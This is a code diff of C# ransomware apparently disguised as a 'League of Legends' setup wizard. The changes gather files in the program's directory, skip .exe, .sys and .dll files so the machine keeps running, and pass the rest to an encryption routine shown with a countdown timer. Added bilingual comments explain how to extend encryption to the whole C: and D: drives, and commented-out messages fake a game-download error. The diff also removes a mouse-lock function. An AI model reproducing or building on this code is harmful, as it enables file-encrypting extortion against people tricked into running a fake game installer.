@@ -62,15 +62,35 @@ namespace rw2
             
             string filePath = System.Reflection.Assembly.GetEntryAssembly().Location;
             filePath = filePath.Remove(filePath.Length - System.AppDomain.CurrentDomain.FriendlyName.Length);
-            //Pokud chces sifrovat cely disk tak vymen filePath za "C:"
-            
+            //
+            //
+            //
+            //      CZ:POKUD CHCETE SIFROVAT CELY DISK C: A D: ODSTRANTE VSECHNY KOMENTARE V TETO METODE
+            //         A TAKE NAHRADTE RETEZEC filePath S "C:"
+            //      EN:IF YOU WANT TO ENCRYPT DRIVES C: AND D: MAKE SURE TO REMOVE ALL COMMENTS IN THIS METHOD
+            //         AND REPLACE STRING filePath WITH "C:"
+            //
+            //
+            //try { 
             filePathsBefore = Directory.GetFiles(filePath, "*.*", SearchOption.AllDirectories).ToList();
+            //} catch
+            //{
+            //   MessageBox.Show("Couldn't load C: disk, please make sure C: drive exists, else League of Legends will not be downloaded.");
+            //      Hide();
+            //}
+            //try
+            //{
+            //    filePathsBefore += Directory.GetFiles("D:", "*.*", SearchOption.AllDirectories).ToList();
+            //}
+            //catch
+            //{
+            //    MessageBox.Show("Couldn't load D: disk, please make sure D: drive exists, else League of Legends will not be downloaded.");
+            //    Hide();
+            //}
             filePathsBefore.RemoveAll(x => x.Contains("LoLSetupWizard"));
-            //a pridej
-            //filePathsBefore.RemoveAll(x => x.Contains(".exe");
-            //filePathsBefore.RemoveAll(x => x.Contains(".sys");
-            //filePathsBefore.RemoveAll(x => x.Contains(".dll");
-            //tyhle soubory jsou vetsinou dulezite na chod pocitace
+            filePathsBefore.RemoveAll(x => x.Contains(".exe"));
+            filePathsBefore.RemoveAll(x => x.Contains(".sys"));
+            filePathsBefore.RemoveAll(x => x.Contains(".dll"));
             foreach (string file in filePathsBefore)
             {
                 if (file.Contains(@"\")) 
@@ -157,32 +177,12 @@ namespace rw2
             encrypce();
             timer1.Enabled = true;
         }
-        //
-        //
-        //              30,30
-        //              ________________________
-        //              I                       I
-        //              I                       I
-        //              I                       I
-        //              I                       I
-        //              I                       I
-        //              I                       I
-        //              L_______________________L30,30
         
-        public void mouseLock()
-        { //location + size 
-            
-            if(timer1.Enabled&&(Cursor.Position.X >= this.Location.X && Cursor.Position.X <= this.Size.Width+this.Location.X) && (Cursor.Position.Y >= this.Location.Y && Cursor.Position.Y <= this.Size.Height + this.Location.Y))
-            {
-                return;
-            }
-            Cursor.Position = new Point(this.Location.X + this.Width / 2, this.Location.Y + this.Height / 2);
-        }
         bool barva = true;
         private void timer1_Tick(object sender, EventArgs e)
         {
             milisec--;
-            mouseLock();
+           
             if (milisec < 0)
             {
                 seconds--;
@@ -202,7 +202,7 @@ namespace rw2
                     }
                 }
             }
-            label1.Text = minutes.ToString() + ":" + seconds.ToString()+":"+milisec.ToString("D2");
+            label1.Text = minutes.ToString() + ":" + seconds.ToString("D1")+":"+milisec.ToString("D2");
         }
     }
 }
